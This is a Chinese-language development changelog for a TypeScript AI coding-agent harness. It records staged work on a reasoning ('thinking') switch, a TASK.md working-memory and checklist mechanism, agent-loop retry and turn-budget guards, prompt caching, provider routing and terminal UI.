**牵连系统 / 层次**：Runtime 编排层（runtime/runtime.ts）· Agent Loop（loop/agent-loop.ts + core/loop.ts）· LLM 协议层（llm/types.ts + stream-helper.ts + deepseek/anthropic）· 提示词/上下文层（context/system-prompt.ts）· 启动链（harness/main.ts + types.ts）· 验证脚本（scripts/）

**面向的问题**：
- C1 留下的 'auto' 是空语义：Provider 侧按关闭处理，无 Runtime 判定则配置写了也不生效（开关三态只落地了两态）
- TASK.md 无任何清理机制（代码全量搜索零匹配）：文件一旦创建永久留盘，而轮数预算判定只看“文件是否存在”——全勾选的遗留计划会造成三重误发：闲聊也被放大到 15 轮预算、C2 上线后简单对话被开推理、续传提示反复注入（用户拍板：清理放工程侧，不依赖模型自觉）
- 检测标准漂移风险：提示词层续传提示与工程侧清理都需要检测“未勾选项”，若各写一份正则将来必然漂移（约定与实现脱节）
- thinking 必须按轮判定而非会话级固定：同一会话会交替简单/复杂轮次，而 provider 在构造时拿的是静态配置——需要一条“按次覆盖”通道穿过 Loop 到达请求层（优先级高于配置）
- Anthropic 的 thinking 协议（budget_tokens + thinking 块多轮回放）水最深，C2 不应碰，但接口签名需先对齐（避免 C3 再改一遍接口面）

**做出的改动**：
- 接口层：新增 LLMRequestOptions（按次请求选项，thinking?: boolean）；LLMProvider.chat/stream 加可选第三参；AgentLoopOptions 加 thinking；RuntimeOptions/types.ts 加 thinking 模式；main.ts 用条件展开透传（适配 exactOptionalPropertyTypes）
- 判定与下发：Runtime.runSingleTurn 按模式求值（'on' 常开；'off' 常关；'auto' 仅当 taskMemory 非空时开），与 maxTurns 一起按次传入 agentLoop.run；agent-loop 把 opts.thinking 透传给 llm.stream；stream-helper 的 resolveThinkingEnabled 从“只看配置”改为“按次覆盖 > 配置”优先级解析（两处 body 构造未动，C1 单挂点设计验证有效）
- 工程侧清理：runtime.ts 新增模块级导出 loadTaskMemory（读 + 截断 + 全勾选即删，删除失败静默不阻塞请求）；旧 readTaskMemory 实例方法删除（无调用方）——清理与判定共享同一信号：全勾选文件读时已删，后续判定自然拿到 undefined（僵尸计划不污染 auto，也不需要额外的定时清理/启动清理机制）
- 单一真相源：复选框检测抽为 context/system-prompt.ts 导出的 hasUncheckedTask（兼容 "- [ ]" 与 "* [ ]"、缩进变体）；提示词层续传判定与工程侧清理共用，避免两处正则漂移；Anthropic provider 仅对齐签名不消费 opts（C3 再实现，边界显式标注）
- scripts/verify-c2.ts：假 SSE 服务器 + 假 LLM + 临时文件，验证覆盖优先级三态、Loop 透传（含缺省不下发的向后兼容）、检测标准五个变体、清理语义六种情形共 16 项；退出沿用 C1 的延迟 100ms 规避 libuv 断言；修掉初稿中 ESM 下误用 require 的一处（改导入的 unlinkSync）
- 编译验证：tsc --noEmit 零错误（修掉旧方法成壳的 TS6133）；阶段 A/B 回归 13/13、C1 回归 8/8 全绿（判定链路未破坏既有防护）

**解决的问题**：
- 'auto' 从配置摆设变为真实语义：有进行中任务自动开推理、闲聊自动关——成本/延迟的取舍由工程侧按任务状态自动裁决，不靠用户手动切换（六杠杆①的智能化落地，与⑥工作记忆信号合流：同一份 TASK.md 同时驱动轮数预算、续传、推理开关三个决策）
- TASK.md 生命周期首次闭环（创建→更新→清理全部工程侧可预期）：遗留已完成计划不再造成轮数预算/推理/续传三重误发；清理不依赖模型自觉（用户方案），也不需要新机制（借用每次请求的读路径顺带善后）
- 判定与清理共享同一信号源，行为不会互相矛盾；按次覆盖通道为后续更细粒度的判定（如按任务类型分级推理预算）预留了同一条路（接口不再改）
- 验证边界：真实供应商对 thinking:enabled 的支持仍未实测（同 C1 标注）；Anthropic 路径 opts 已接收但未消费（待 C3）——未验证项如实标注，不冒充已验证（验证边界诚实）
- 复选框约定同前：本次无新增提示词约定；清理是纯工程行为，模型无需知道文件何时被删（对提示词透明）

**未来可优化**：
- Anthropic thinking（C3，budget_tokens + thinking 块回放，协议水最深单独一轮）；auto 判定目前仅 TASK.md 单一信号，可补充启发式（用户输入长度/关键词）作无计划时的辅助判定；unlinkSync 失败静默吞，可接诊断记录（warn:runtime）；验证脚本可并入统一回归入口（目前三个脚本手动依次跑）——C3 路线明确，本次不启动（阶段隔离）

---

## 2026-08-30 10:38 | 阶段C1 thinking 开关（配置→请求→流解析→展示 四段链路打通）

**牵连系统 / 层次**：LLM 协议层（llm/types.ts + stream-helper.ts）· 配置子系统（config/）· Agent Loop（loop/）· 事件层（runtime/events.ts）· 两套 UI（io/ui/）· 验证脚本（scripts/）

**面向的问题**：
- 模型推理能力被物理关闭：stream-helper 两处写死 thinking:disabled（当初为 tool loop 稳定），复杂任务模型"裸答"，无推理缓冲——思维链六杠杆中见效最快的单一开关被一行代码锁死（上轮断链诊断结论）
- 开关若做成硬编码切换，简单任务也被迫等推理（延迟/成本双输）——需要三态配置而非布尔开关；'auto' 预留但 C1 不实现判定（避免一次改动跨 Runtime/Provider 两层，风险隔离）
- 开启后推理内容会先于正文流式到达，若不识别会被静默丢弃（浪费），若混入正文则污染 finalText/会话历史/兜底回溯——需要专用事件通道分流（展示不持久）
- 推理文本可能几千 token，直接灌屏噪音大；完全不展示则用户只见长时间无输出（体验断链）——展示策略需要分层：轻量指示而非全文倾倒
- 缺省行为必须与改动前完全一致（向后兼容）：未配置时等同关闭，存量行为零变化；验证需覆盖三态+缺省而不只是开启态（避免回归盲区）
- Windows 上验证脚本 server.close 后立即 process.exit 触发 libuv 断言（崩溃非业务错误），验证基础设施需要可靠的退出路径（后续脚本可复用）

**做出的改动**：
- LLMConfig 新增 thinking 可选字段（'auto'|'on'|'off'）；config/manager 从 active-config 透传（不写时缺省，不引入新必填项）
- stream-helper 新增 resolveThinkingEnabled 单一挂点：'on'→enabled，其余（含 'auto'）→disabled；两处请求构造改按它求值——C2 的 Runtime 判定只需改这一个函数，不再碰两处 body 构造（挂点收敛）
- 流式解析新增 delta.reasoning_content 分支：推独立 {type:'reasoning'} 事件，不进 full 累积——finalText/历史/兜底回溯只拿正式答案，推理仅供展示（展示不持久，会话存储零膨胀）
- 事件链：LLMStreamEvent 加 reasoning 变体 → agent-loop 透传为 stream_reasoning（不进 turnText/不走 onToken，与 stream_text 同构）→ 两套 UI 各自适配：TerminalUI 首片切 spinner 为"🧠 推理中"（零噪音指示）；TreeUI 只累计字数，收尾在回复框顶部一行灰色摘要"💭 思考了 N 字"（告诉用户想过多久，不倾倒全文）——展示粒度按 UI 形态各自最小化，不引入新组件（改动面收敛）
- scripts/verify-c1.ts：本地假 OpenAI 兼容 SSE 服务器（捕获请求体 + 回放预制流），验证三态+缺省请求参数、reasoning/正文分流、非流式不污染共 8 项；退出用延迟 100ms 规避 Windows libuv 断言（后续脚本可复用）
- 编译验证：tsc --noEmit 零错误；阶段 A/B 回归 13/13 全绿（reasoning 分支未破坏既有防护）
- 配置文件：active-config.json 与 example 加 thinking: 'auto'（缺省安全：行为与改动前完全一致，手动改 'on' 即启用）

**解决的问题**：
- 阶段 C1 把"被一行代码关着的推理能力"变成三态可配：'on' 即开，缺省零回归；推理与正文分流保证思维链增强不污染答案链路（六杠杆①落地，与②③⑥ 已落地的杠杆叠加而非互斥——提示词教方法、计划给结构、记忆保不丢、thinking 给深度，四层同向）
- 展示策略按 UI 形态各自最小化（不引入新组件），验证脚本可重复（回归秒级）；'auto' 判定挂点收敛在单一函数，C2 改动面预先最小化（为下一阶段铺路）
- 复选框约定同前：本次无新增约定；thinking 配置项是配置层约定（写入 active-config，不进入提示词层——模型无需知道开关状态，推理与否对提示词透明）
- 验证边界：本次未验证真实供应商对 thinking:enabled 的支持（代理层行为未知），待用户手动改 'on' 后实测（若代理不支持会报错而非静默降级，错误已由阶段 B 的 catch 暴露机制可见）——未验证项如实标注，不冒充已验证（验证边界诚实）

**未来可优化**：
- 'auto' 判定（C2，复用 TASK.md 存在信号）；Anthropic 路径 thinking（C3，budget_tokens + thinking 块回放，协议水最深单独一轮）；推理展示可升级为可折叠区域（需要新 UI 组件）；非流式 chat 的 reasoning_content 目前忽略（若 compaction 需要再补）；推理延迟可配合 UI 的 thinking 阶段指示细化（预估剩余时间）——C2/C3 路线明确，本次不启动（阶段隔离）

---

## 2026-08-30 10:19 | 阶段B 计划驱动循环（TASK.md 复选框清单 + 续传提示）+ 空流区分兜底 + 验证脚本化

**牵连系统 / 层次**：提示词 core 层（context/sections/core-section.ts）· SystemPromptService（context/system-prompt.ts）· Agent Loop（loop/agent-loop.ts）· Provider 层（llm/）· 验证脚本（scripts/）

**面向的问题**：
- 规划只是口头描述：模型"给出方案"后执行中易跑偏，断点续传无结构化依据（阶段 A 给了地图的位置，本次把地图实体化）
- 冒烟实测发现新误报：流被异常中断（401 余额不足）时空流静默走完循环，兜底文案误报"达到最大轮数"
- provider 的 catch {} 吞错，上层只见空流，真实错误无定位线索（排查靠猜）
- RPC 协议并发处理请求行，外部脚本无法串行化 create→switch→chat（验证基础设施缺失）

**做出的改动**：
- core-section 规划步从"给出方案与步骤清单"升级为"必须用 write 把复选框（- [ ]）步骤清单写入 TASK.md"；【工作记忆】段写明复选框约定（- [ ] → - [x]）与续传提示的响应方式（提示词层教模型）
- SystemPromptService.build 检测 task 清单是否有未勾选项（正则），有则 task 层追加 [续传提示]（从第一个未勾选项继续）——系统发信号、提示词教响应，两边对暗号；全勾选/无 TASK.md 时不注入，零噪音（工程层发信号）
- Agent Loop 增加 finishedEarly 标记区分退出原因：空流提前退出 → 空内容提示 + warn:llm 诊断；真轮数耗尽 → 结构化进展总结；两类兜底各自精准，不再互相冒充（阶段 A 兜底的补丁）
- 两个 provider 的静默 catch 改为 console.error 暴露真实错误（阶段 B 冒烟直接靠它定位到 401 CreditsError）
- scripts/verify-phase-ab.ts：脚本化假 LLM/假工具验证 A1/A2/A3/B1 共 13 项（不消耗真实 API，秒级可重复）；scripts/rpc-smoke.mjs：RPC 串行喂料器（等上一条响应再发下一条，规避协议并发竞态）
- 编译验证：tsc --noEmit 零错误；真实链路冒烟初次受阻（OpenCode Go 余额不足 401），更换 API key 后重跑通过（2.8s 真实响应）

**解决的问题**：
- 计划从"口头表述"变为"持久化复选框清单"：压缩碰不到、断链后可从第一个未勾选项续传（②③⑥ 组合拳的最后一环落地）
- 空流误报消除：余额不足/密钥无效等场景用户看到准确原因指引，真实错误在终端与诊断可见（从"猜"到"读一行"）
- 阶段 A/B 全部防护逻辑有可重复的自动化验证，回归成本秒级；临时会话文件已清理不污染默认会话（RPC 支持临时会话验证是意外收益）
- 复选框约定（- [ ]）同时是给人看的进度和给系统检测的协议，一份载体两个用途；提示词（约定）与工程（检测）分属两层，互不侵入（续传检测在分层架构的 task 层，不碰稳定前缀）

**未来可优化**：
- 续传提示只认 "- [ ]" 格式，模型若用中文复选框（□/☑）会漏检（正则可放宽或提示词强化约定）；可统计 TASK.md 复选框推进率作为效果度量；rpc-smoke 可并入验证流程（需有余额的供应商）；阶段 C（thinking 开关）的多轮回放设计待启动

---

## 2026-08-30 10:00 | Agent Loop 可靠性防护：重复失败检测 + 轮数耗尽收尾 + 轮数预算分级

**牵连系统 / 层次**：Agent Loop（loop/ + core/loop.ts）· Runtime 编排层（runtime/）· 提示词 core 层（context/sections/core-section.ts）

**面向的问题**：
- 重复失败断链：模型可用相同参数反复调同一工具烧完全部轮次，无任何防护提示（上一轮"断链诊断"识别的高频断链模式）
- 轮数耗尽断链：MAX_TURNS=5 用尽后把最后一条消息原始内容（可能是工具 JSON 输出）直接抛给用户当最终回复，最暴力的断链点
- 轮数预算一刀切：带计划的复杂任务也只有 5 轮，常中途断掉；无计划的闲聊却不需要更多轮次
- 失败判定若一刀切会把 NOT_FOUND/NO_MATCH 类"有效否定"误判为失败，干扰模型正常的探索行为（如换关键词重搜）

**做出的改动**：
- 重复失败追踪器：调用 key = 工具名 + 规范化参数（顶层 key 排序），同 key 连续失败 2 次追加"换策略"提示、3+ 次追加"弃路径"提示；换了调用或同调用成功即重置；仅建议不硬阻断（避免误伤合理重试）
- 失败三分类：硬失败（异常/[ERROR]/[VERIFY_FAILED]）才计；有效否定（NOT_FOUND/NO_MATCH/EMPTY）不计；用户拒绝提前 continue 不进检测（用户意志不是模型的错）
- 提示注入点选在"追加进失败工具结果的 content"而非新增消息：新增 user 消息经 Anthropic 转换后与前一条（也是 user）连续，违反 user/assistant 交替约束直接 400；追加进 tool 结果对两种协议都是自由文本，协议安全（与既有的连续 tool_result 合并同一设计模式）
- 轮数耗尽收尾：最后一轮前注入收尾提示（停止新步骤 + write 进度入 TASK.md + 返回总结）；耗尽后兜底从"抛原始内容"改回溯最后 assistant 进展说明 + warn 诊断；配套 core-section 铁律"断点纪律"教模型如何响应信号（工程发信号 + 提示词教响应，两边对暗号）
- run() 增加按次 opts.maxTurns；core/loop.ts 新增 AgentLoopOptions；Runtime 检测 TASK.md 存在时从 DEFAULT_MAX_TURNS(5) 放大到 WITH_PLAN_MAX_TURNS(15)——计划给了循环"地图"，配断点续传允许更长推进；向后兼容（缺省参数不变行为）
- core-section 铁律新增两条：收尾必验证（写/改代码必跑测试/编译再汇报）——验证闭环的提示词层最小落地；断点纪律——与收尾信号配套；重复失败提示与既有【工具增强推理】段形成呼应（失败后先查再换路）
- 编译验证：tsc --noEmit 零错误（修复一处 TS 控制流窄化：三元赋值中读写同一变量导致 else 分支 never）

**解决的问题**：
- 同一路径反复失败被及时提醒换策略，不再无声烧完轮次；失败分类不误伤探索行为与用户拒绝
- 轮数耗尽时用户看到的是结构化进展总结（完成了什么/没完成什么/可说"继续"），而非工具原始输出；进展落盘 TASK.md 支持断点续传，轮数上限从"硬断链"变"软断点"
- 复杂任务轮数预算 3 倍（5→15）且由"有无计划"自动区分，简单任务不受影响、防死循环底线不变；注入方式对 OpenAI/Anthropic 双协议安全，无转换层改动；全部防护是建议性引导，模型自主权保留；提示词（铁律）与工程（信号/检测）两层配套，不是单侧改动；向后兼容：缺省不传 opts 时行为与之前完全一致，仅兜底质量提升

**未来可优化**：
- NOT_FOUND/NO_MATCH 类"空结果"连续重复时可另给换路径/关键词的差异化提示
- 轮数预算可移入 active-config 做用户级配置
- 提示词层引导可升级为"收尾前主动检查 TASK.md 未勾选项"（阶段 B 计划驱动循环的入口）
- 重复失败追踪目前仅看连续同 key，跨轮的"变参反复失败同目标"（如路径猜错三次）暂未识别，可升级为按工具+目标相似度聚类

---

## 2026-08-28 19:18 | 工作记忆层（TASK.md 独立持久通道，压缩不触碰）

**牵连系统 / 层次**：SystemPromptService（context/ + core/）· Runtime 编排层（runtime/，注入）· 提示词 core 层（context/sections/core-section.ts）

**面向的问题**：
- 任务计划/进度只存在于对话历史里：不结构化、随历史漂移、被压缩后"失忆"（断链根因）
- 需要独立于对话历史的"工作记忆"通道——压缩只压缩 jsonl 历史，工作记忆必须不被触碰

**做出的改动**：
- SystemPromptContext 新增 `task?` 字段；SystemPromptLayer 新增 `task` 层；build 在 skills 后、summary 前插入 task 层（`## 当前任务（工作记忆）`）
- Runtime 新增 `readTaskMemory()`：每次请求读工作目录 `TASK.md`（存在才注入，截断 2000 字符防膨胀，读失败静默跳过）
- core-section 新增【工作记忆】引导段：复杂任务开始用 write 建 TASK.md（目标/计划/进度/经验），每完成一步 write 更新

**解决的问题**：
- 压缩保留的本质解耦：TASK.md 在文件系统，compaction 只操作 jsonl 消息数组 → 压缩**物理上碰不到工作记忆**
- 注入与压缩解耦：每次请求重新读文件注入，历史裁掉多少都不影响 task 层
- 任务状态从"埋在长对话里"变为"结构化可查"，模型随时知道做到哪、下一步做什么

**未来可优化**：
- 压缩摘要结构化（提取任务状态字段作兜底，即使模型漏建 TASK.md 也保真）
- 多会话隔离（当前 TASK.md 在工作目录全局共享；可迁会话目录）
- TASK.md 与 compaction 的联动：压缩发生时提示模型刷新 TASK.md

---

## 2026-08-28 18:25 | 思维链强化·阶段1：任务方法论提示词 + 工具增强推理（ls 工具）

**牵连系统 / 层次**：SystemPromptService core 层（context/sections/core-section.ts）· 工具子系统（tools/builtin.ts）· Agent Loop（loop/agent-loop.ts，接住工具结果）

**面向的问题**：
- core-section 只是"别乱调工具"的约束型提示词，模型接到复杂任务不会"按章法办事"（先理解→规划→分步→验证）
- 推理受阻时模型靠脑补而非用工具确认事实/计算结果，思维链质量低（杠杆⑤缺失）
- 缺 ls 工具，模型无法先看清项目结构再动手（read/grep 需要已知路径，没有"看结构"的入口）

**做出的改动**：
- core-section 升级为任务方法论（杠杆②）：场景判断（普通对话直答 / 实际任务主动用工具）→ 任务执行流程（先理解→规划→分步→验证→总结）→ 工具增强推理引导（不确定就查、算不清就跑）→ 铁律
- 新增 ls 工具（杠杆⑤）：node:fs 递归列目录，目录带 / 后缀，跳过 .git/node_modules/dist 噪音，默认 depth 1、上限 200 项，统一 [OK]/[NOT_FOUND]/[EMPTY] 格式

**解决的问题**：
- 模型接到实际任务有明确流程可循，不再是"直接甩代码"
- 工具增强推理有落点：结构不确定用 ls/read/grep、计算用 bash 验证，基于真实结果继续推理
- 工具从 4 个扩到 5 个，llm 的 tools 参数自动带上 ls（ToolRegistry.getLLMTools）

**未来可优化**：
- 新增 fetch（网页抓取）/ 并行 read（批量读多文件），见 ROADMAP P7 实用工具补全
- 任务分解（Orchestrator-Workers） + TASK.md 工作记忆（杠杆③⑥，下一阶段）
- 验证修正闭环（Evaluator-Optimizer）+ 模型推理模式开关（杠杆④①）

---

## 2026-08-28 16:40 | 提示词缓存优化：分层 system 消息 + Anthropic 缓存断点

**牵连系统 / 层次**：SystemPromptService（context/ + core/）· CompactionService（context/ + core/）· Runtime 编排层（runtime/）· Provider 转换层（llm/anthropic.ts）

**面向的问题**：
- 系统提示词是单条动态混合体（工具/技能/规则/摘要一次 build），任一动态部分变化即整条缓存失效，命中率低
- 会话摘要被 unshift 进 `history[0]` 污染历史前缀；runtime 又从 `history[0]` 提取摘要，历史中的摘要消息被二次发送
- Anthropic 接入时：分层 system 消息互相覆盖（只留最后一条）；无 `cache_control` 断点则缓存不生效；tools 参数误传 OpenAI 格式会 400；并行工具调用产生连续 user 消息违反交替约束

**做出的改动**：
- SystemPromptService.build 改返回**分层 system 消息数组**（core → tools → skills → summary，稳定前缀在前）；Config 段落按 core/tools/skills 三组配置；`before_request` hook 从改写单字符串升级为改写消息数组
- CompactionService.maybeCompact 改返回 `{ history, summary }`，摘要独立交付，不再混入历史；runtime 按分层展开 + 干净历史拼装
- Anthropic 转换层：system 改文本块数组逐条保留；稳定段（core/tools/skills）各设一个 `cache_control` 断点、摘要段不设，tools 参数末工具设第 4 个断点（达官方推荐上限）；tools 改 `{name, input_schema}` 格式；连续 tool_result 合并进单条 user 消息；`is_error` 按 `[工具` 前缀判断

**解决的问题**：
- 稳定前缀缓存命中率提升：工具/技能/摘要各自变化只作废对应层及之后的缓存，人设层照常命中
- 消除摘要污染历史前缀 + 二次发送；OpenAI 兼容层（自动缓存前缀）与 Anthropic（显式断点）两条路径在分层设计下自洽
- Anthropic 从"分层即坏"到"带缓存断点可用"

**未来可优化**：
- 长文档/参考文档层预留位（TODO 已标在 core 之后、tools 之前，可插入稳定参考不破坏现有前缀）
- OpenAI 兼容层若遇到严格要求单条 system 的服务，需在 stream-helper 合并连续 system
- Anthropic 流式 `message_delta` 的 `stop_reason` 未利用，工具断点/截断语义待接入 Agent Loop
- `tool_result.is_error` 依赖 `[工具` 前缀启发式判断，工具结果结构化后可精确化

---

## 2026-08-15 | 系统提示词子系统化 + 扩展系统自动装载

**牵连系统 / 层次**：SystemPromptService（context/ + core/）· EventBus（runtime/ + core/）· extension-loader（context/）· extensions/ · Runtime

**面向的问题**：
- 系统提示词硬编码在 runtime.ts 的字符串里，不可扩展、不可配置
- 出现 hook 需求，但不应另起炉灶新建 HookBus，需复用现有 EventBus
- 扩展段落/钩子要自动装载——从层次1（改 main）演进到层次3（用户改代码即生效）

**做出的改动**：
- SystemPromptService 子系统（core 接口 + Impl）：配置驱动（段落列表）+ 发请求时动态计算 + hook 改写（before_build / before_request）
- 段落可插拔：core/tools/skills 三内置段落 + 兜底提示词，用户写 TS 模块即扩展
- 扩展系统自动装载：extension-loader 扫描 extensions/sections/ + extensions/hooks/，export registerSections / registerHooks 即生效
- EventBus 泛型化（EventBus<T>，默认 unknown），PromptEventEmitter implements EventBus<RuntimeEvent>；emitHook 开放 public
- 补漏接口：SystemPromptService 建 core 接口、PermissionManager implements PermissionProvider

**解决的问题**：
- 系统提示词从"改代码"变为"配置 + 扩展"，可插拔可改写
- hook 复用 EventBus.on，不引入重复机制
- 扩展系统用户零侵入：新建文件即装载

**未来可优化**：
- 段落分层声明（当前用户扩展段落固定并入 core 稳定层，见 8-28 缓存优化）
- hook 生命周期细化（工具调用钩子 beforeToolCall/afterToolCall，ROADMAP P6）

---

## 2026-08-12 ~ 08-13 | P5 多系统分离（全对称子系统化 + 命名规范）

**牵连系统 / 层次**：core/ 接口层（9 接口）· session/ · tools/ · context/ · loop/ · commands/ · diagnostics/ · runtime/ · harness/

**面向的问题**：
- Runtime 既创建子系统又负责编排，职责膨胀
- 子系统实现与接口耦合，instanceof 判断破坏抽象（如压缩强 cast 到 JsonlSession）
- 命名混乱（Adapter/Manager/Storage 混用），无法从名字判断角色

**做出的改动**：
- 多系统全对称：core/ 补 4 接口（compaction/loop/commands/diagnostics），8 子系统全部 implements core 接口
- Runtime 构造注入所有子系统（不再 new），prompt 只剩编排；main 显式组装注入
- 命名规范统一：执行类 Service + Impl（CompactionService/AgentLoopService/CommandService/DiagnosticsService）、能力提供 Provider、数据类 Storage/Store/Bus
- CompactionStore 接口独立（压缩存储能力），jsonl 双实现，InMemory/Mock 明确不支持
- REPL 抽离 harness/repl.ts 与 rpc.ts 对称；PermissionManager 迁 permission/manager.ts 修实现错位

**解决的问题**：
- 系统边界清晰、可独立替换、测试友好
- 抽象不被 instanceof 破坏，注入即依赖声明
- 命名即角色，代码可读性提升

**未来可优化**：
- 正式测试套件（vitest）建立子系统单测回归（ROADMAP P6）
- 结构化 trace/span 可观测层（ROADMAP P6）
- 模块数 20+ 后评估 DI 容器（ARCHITECTURE.md 决策6 预留）

---

## 2026-08-06 ~ 08-07 | 配置系统重构 + 协议层抽象 + 可靠性工程

**牵连系统 / 层次**：config/（manager）· llm/（provider.ts）· harness/（check）· commands/（/model）· diagnostics/

**面向的问题**：
- 配置散落多文件、无分层，provider-registry 冗余
- 启动无自检，配置坏了才在运行时暴露；错误不可追踪
- /provider 与 /model 两命令职责重叠

**做出的改动**：
- 删 provider-registry，新建 config/manager：配置分层（环境变量 > 全局 ~/.ts-agent > 项目 keys > 项目 active），active-config 不再含 apiKey
- 协议层抽象：Provider 对象（数据 + 行为自包含）+ ProviderRegistry + createProviderFromConfig；createProvider 去 switch
- 命令合并：/provider + /model → 单一 /model（一级供应商、二级模型）
- 可靠性工程：Diagnostic 公共类型 + check 逐项启动自检（配置/API key/连通性/模型列表）+ 严重度分级 + 运行时诊断队列 + debug-runtime.log 落盘 + /diagnostics 命令

**解决的问题**：
- 配置单一真相源、分层可覆盖；Provider 对象化让"换供应商"变成"换对象"
- 错误启动即暴露；运行时错误可追溯可查看

**未来可优化**：
- 会话级配置层（config/manager 顶部 TODO 已标注）
- 诊断可视化 / 结构化上报

---

## 2026-08-05 | 工具调用升级 function calling + 会话存储重构为 entry 树

**牵连系统 / 层次**：tools/ · llm/（协议层）· session/（jsonl-storage）· commands/（/history）

**面向的问题**：
- `<tool_call>` 标签解析脆弱，依赖 fixJSON 文本补丁，非结构化
- 会话线性存储不可分叉，历史回溯/多分支能力弱

**做出的改动**：
- 工具调用升级 function calling：API tools 参数 + tool_calls 结构化事件，废弃标签解析；删除 parseToolCalls / createToolCallFilter / fixJSON；系统提示词移除标签引导
- 会话存储重构为 entry 树 + leaf + fork（对齐 Pi）：消息带 parentId、leaf 指针持久化、摘要入树为 compaction entry；/history 改分叉（fork 复制前缀，原历史保留）

**解决的问题**：
- 工具调用结构化稳定，无需文本补丁
- 会话可分叉回溯，支持多分支探索

**未来可优化**：
- 旧 v1 线性格式已归档（sessions/archive-v1/），迁移工具
- 分支摘要：fork 后旧分支上下文摘要回填新分支（ROADMAP P6）

---

## 2026-08-02 | UI 自研组件树（替代 pi-tui）

**牵连系统 / 层次**：io/ui/（components/screen/input-handler）· io/terminal.ts

**面向的问题**：
- pi-tui 在 Windows 终端同步输出协议不兼容（乱码/空行/闪退）
- 第三方 UI 框架不可控，无法精细处理中文与差分布局

**做出的改动**：
- 卸载 pi-tui，自研组件树（Container/Text/SelectList）+ Screen 差分渲染（行数组快照 + 只清行/光标移动，避开同步输出坑）+ InputHandler（raw mode 逐键解析）
- 配套：wrapText 按可见宽度折行 + 中文标点禁排；fitWidth 防终端 wrap

**解决的问题**：
- 终端渲染稳定可控，中文对齐正确
- 差分渲染避免整屏重绘闪烁

**未来可优化**：
- 虚拟滚动（长对话渲染）
- 选择器固定行数回退方案（FIXED_LINES）在极端窄终端下的边界

---

## 2026-07-30 | LLM Provider 工厂路由（多协议接入）

**牵连系统 / 层次**：llm/（index/deepseek/anthropic/provider）

**面向的问题**：
- 只支持 deepseek 单一协议，接入新厂商需改代码

**做出的改动**：
- LLMConfig.provider 字段路由 deepseek/openai/anthropic/opencode-go
- 新增 AnthropicProvider（消息格式转换 + API 端点 + SSE 解析适配）；AnthropicAdapter 统一改名 Provider
- 供应商定义迁 config/providers.json 运行时载入；API Key 支持环境变量（apiKeyEnv）；模型列表启动远程拉取失败兜底 staticModels

**解决的问题**：
- 多厂商可插拔，新增供应商不动核心
- 供应商配置与密钥分离，密钥可走环境变量

**未来可优化**：
- Ollama 等更多协议接入（ROADMAP TODO）
- 后续 8-28 已补充 Anthropic 缓存断点 + 工具格式修正

---

## 2026-07-27 | 工具系统 + 命令自动扫描 + 事件组合模式 + EventStream

**牵连系统 / 层次**：tools/（registry+builtin）· commands/（loader）· runtime/（events/event-stream）· io/ui/

**面向的问题**：
- 工具调用逻辑内嵌 runtime.ts，无法扩展新工具
- 命令硬编码，新命令需改 main
- 事件系统用继承耦合（Runtime 继承 emitter），扩展受限于单继承

**做出的改动**：
- 工具系统：ToolRegistry + read/write/grep/bash 四核心工具 + Agent Loop（chat 检测 → stream 输出双阶段）
- 命令系统自动扫描：Loader 基类 + CommandLoader + SkillLoader（scanFiles 扫描约定目录）
- 事件系统改组合模式（Runtime 持有 PromptEventEmitter 而非继承）；新增 EventStream 推拉通道统一 LLM 流式输出
- 工具调用逻辑抽离 utils.ts；工具输出统一 `[STATUS_CODE]` 格式

**解决的问题**：
- 工具/命令/技能可扩展，新增即放文件
- 事件低耦合，流式统一通道

**未来可优化**：
- 工具参数 schema 自动校验（ROADMAP P6，替代手动 requireString）
- 工具调用钩子 before/afterToolCall（ROADMAP P6）

---

## 2026-07-23 | 项目结构分层（core/harness/runtime/io/utils）

**牵连系统 / 层次**：整体目录结构 · src/

**面向的问题**：
- 扁平结构（main.ts/types.ts/init.ts 平铺），职责不清、依赖混乱

**做出的改动**：
- 按 core（接口/类型）/ harness（编排启动）/ runtime（运行时编排）/ io（终端 I/O）/ utils（工具）分类
- 移除 init.ts，main.ts 迁 harness/main.ts 持有 REPL/RPC 模式分发；Mode 枚举（Repl/Rpc）
- SessionStorage 接口 + InMemory/Mock 实现

**解决的问题**：
- 目录即架构，职责边界可见
- 为后续多系统拆分（P5）铺路

**未来可优化**：
- 后续演进见 P5 多系统分离（2026-08-12 已实现）

---
